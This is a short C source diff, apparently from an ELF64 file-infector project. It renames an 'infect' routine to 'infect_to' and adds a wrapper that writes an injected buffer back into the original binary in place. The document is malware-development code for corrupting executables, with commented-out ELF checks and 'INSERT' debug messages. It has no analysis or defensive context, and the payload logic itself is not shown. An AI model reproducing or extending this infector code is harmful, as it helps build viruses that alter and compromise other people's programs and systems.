@@ -66,7 +66,7 @@ static size_t _prepare(char **s, size_t *n, char *b, size_t bn){
 	return pos;
 }
 
-void infect(char *fname, char *to, char *b, size_t bn){
+void infect_to(char *fname, char *to, char *b, size_t bn){
 	//if (isFile(fname) == FALSE) return fail("not file");
 	//if (isElf64(fname) == FALSE) return fail("not elf64 binary");
 	char *s; size_t n;
@@ -75,6 +75,9 @@ void infect(char *fname, char *to, char *b, size_t bn){
 	//after insert, update data
 	_prepare(&s,&n, b, bn);
 	//printf("INSERT NOW!\n");
-	println("INSERT!");
+	println("INSERT in");
 	fput(to, s, n);
+}
+void infect(char *fname, char *b, size_t bn){
+	infect_to(fname, fname, b, bn);
 }
